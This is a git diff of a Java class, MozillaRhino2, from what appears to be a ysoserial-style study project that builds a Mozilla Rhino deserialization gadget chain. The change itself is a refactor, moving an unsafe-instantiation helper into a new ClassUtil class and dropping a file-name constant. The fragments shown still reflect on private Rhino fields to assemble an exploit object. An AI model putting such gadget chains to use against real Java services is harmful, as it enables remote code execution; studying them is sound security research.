@@ -3,6 +3,7 @@ package org.su18.serialize.ysoserial.MozillaRhino.MozillaRhino2;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.mozilla.javascript.*;
 import org.mozilla.javascript.tools.shell.Environment;
+import org.su18.serialize.ysoserial.Utils.ClassUtil;
 import org.su18.serialize.ysoserial.Utils.SerializeUtil;
 
 import java.io.IOException;
@@ -17,9 +18,7 @@ import java.util.Map;
  * @author su18
  */
 public class MozillaRhino2 {
-
-	public static String fileName = "MozillaRhino2.bin";
-
+	
 	public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
 		out.writeObject("java.lang.Object");
 		out.writeObject(new String[0]);
@@ -36,7 +35,7 @@ public class MozillaRhino2 {
 		// 创建 associatedValues
 		Map<Object, Object> associatedValues = new Hashtable<>();
 		// 创建一个 ClassCache 实例
-		Object classCacheObject = SerializeUtil.createInstanceUnsafely(ClassCache.class);
+		Object classCacheObject = ClassUtil.createInstanceUnsafely(ClassCache.class);
 		associatedValues.put("ClassCache", classCacheObject);
 
 		Field associateField = ScriptableObject.class.getDeclaredField("associatedValues");
@@ -86,7 +85,7 @@ public class MozillaRhino2 {
 
 
 		// 实例化 NativeJavaArray类
-		NativeJavaArray nativeJavaArray = (NativeJavaArray) SerializeUtil.createInstanceUnsafely(NativeJavaArray.class);
+		NativeJavaArray nativeJavaArray = (NativeJavaArray) ClassUtil.createInstanceUnsafely(NativeJavaArray.class);
 
 		Field parentField2 = NativeJavaObject.class.getDeclaredField("parent");
 		parentField2.setAccessible(true);
@@ -123,8 +122,8 @@ public class MozillaRhino2 {
 		javaObject3.setAccessible(true);
 		javaObject3.set(nativeJavaObject, nativeJavaArray);
 
-		SerializeUtil.writeObjectToFile(nativeJavaObject, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(nativeJavaObject);
+		SerializeUtil.readFileObject();
 
 	}
 
